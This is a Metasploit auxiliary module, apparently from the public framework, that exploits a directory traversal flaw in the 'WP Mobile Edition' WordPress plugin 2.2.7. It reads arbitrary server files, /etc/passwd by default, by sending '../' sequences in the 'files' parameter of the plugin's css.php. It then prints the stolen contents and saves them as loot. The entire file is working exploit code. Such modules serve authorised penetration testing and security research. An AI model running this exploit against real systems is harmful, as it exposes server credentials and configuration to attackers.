##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Mobile Edition File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "WP Mobile Edition" version 2.2.7, allowing to read arbitrary files with the
        web server privileges.
      },
      'References'     =>
        [
          ['EDB', '36733'],
          ['WPVDB', '7898']
        ],
      'Author'         =>
        [
          'Khwanchai Kaewyos', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, "The path to the file to read", "/etc/passwd"]),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
      ])
  end

  def check
    check_plugin_version_from_readme('wp-mobile-edition', '2.3')
  end

  def run_host(ip)
    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_themes, 'mTheme-Unus', 'css', 'css.php'),
      'vars_get' =>
        {
          'files' => "#{traversal}#{filename}"
        }
    })

    if res && res.code == 200 && res.body.length > 0

      print_status('Downloading file...')
      print_line("\n#{res.body}\n")

      fname = datastore['FILEPATH']

      path = store_loot(
        'mobileedition.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("File saved in: #{path}")
    else
      print_error("Nothing was downloaded. You can try to change the DEPTH parameter.")
    end
  end
end
